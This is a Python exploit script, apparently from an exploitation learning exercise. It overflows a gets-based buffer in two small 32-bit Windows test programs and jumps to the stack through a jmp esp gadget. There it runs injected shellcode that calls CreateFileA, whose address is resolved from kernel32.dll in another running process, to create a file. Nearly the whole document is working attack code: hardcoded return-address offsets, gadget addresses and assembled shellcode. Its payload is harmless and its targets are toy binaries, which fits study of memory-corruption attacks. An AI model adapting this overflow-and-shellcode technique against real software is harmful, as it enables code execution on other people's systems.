# 4th exploit: buffer overflow + jump to stack + touch a file

import sys

from pwintools import *
import windows # from PythonForWindows package

def findModuleByName(process, name):
	ret = None
	for module in process.peb.modules:
		if name == module.name:
			ret = module
			break

	return ret

def findExportInModule(module, name):
	ret = None
	for export in module.pe.exports:
		# print(export)
		if name == export:
			ret = module.pe.exports[export]
	return ret


# for this exploit, the addresses in loaded KERNEL32.DLL are fetched in the py script

# didn't manage to spawn a process..
# cmd = windows.winproxy.CreateProcessA('C:/Windows/SysWOW64/cmd.exe', '/?')

# find any 32bit process
proc32 = None
for process in windows.system.processes:
	try: # discard weird exceptions
		if 32 == process.bitness and not process.token.TokenElevation.TokenIsElevated:
			proc32 = process
			break
	except:
		pass

if None == proc32:
	print('This script is weird, yes: it requires a 32bit program to be running')
	sys.exit()

kernel32_module = findModuleByName(proc32, 'kernel32.dll')

# should never happen
if None == kernel32_module:
	print('No kernel32.dll inside the process')
	sys.exit()

# kernel32_createfilea = kernel32_module.baseaddr + 0xae0fa
kernel_createfilea = findExportInModule(kernel32_module, 'CreateFileA')
print('CreateFileA has address ' + hex(kernel_createfilea))

# 64 bit has non-executable stack
processes = [
	Process('1_gets_gcc_32.exe'),
	Process('1_gets_vs_32.exe'),
]

retAddrOffs = [
	48,
	40,
]

# jmp esp
jmpEspAddr = [
	0x40171f,
	0x4070BA,
]

data = [
	0x401612,
	0x406FF3,
]

injection = asm(
	# 'int3;' +
	'call label123;'
	'label123:'
	'pop ebx;'
	# 'mov ebx, esp' ?
	'xor ecx, ecx;'

	# CreateFileA
	'push ecx;' # no template file
	'push ecx;' # no extra flags

	#'push dword 2;' + # create always
	'mov eax, 2;' # for some reason keystone want to push a word instead of a dword
	'push eax;'

	'push ecx;' # no specified security attributes
	'push ecx;' # no share

	'push dword 0x80000000;' # generic read

	#'lea eax, [ebx + 1 + label456 - label123];' + # here'll be the file name
	'lea eax, [ebx + 0x0063ff02 - 0x0063fee5];' # for some reason keystone can't evaluate the correct distance between labels
	'push eax;'

	'mov eax, ' + str(kernel_createfilea) + ';'
	'call eax;'
	# 'int3;' +
	'label456:',
	32
)

for b in injection:
	if 0x0d == b or 0x0a == b:
		print('Error: assembly contains ' + str(b))
		sys.exit()

for i in range(len(processes)):
	processes[i].recvuntil(b'name:\r\n')
	print(b'Injecting ' + injection)
	processes[i].sendline(b'a'*retAddrOffs[i] + p32(jmpEspAddr[i]) + injection + b'tmp' + str(i).encode('ascii') + b'\0')
	print(processes[i].recvall())
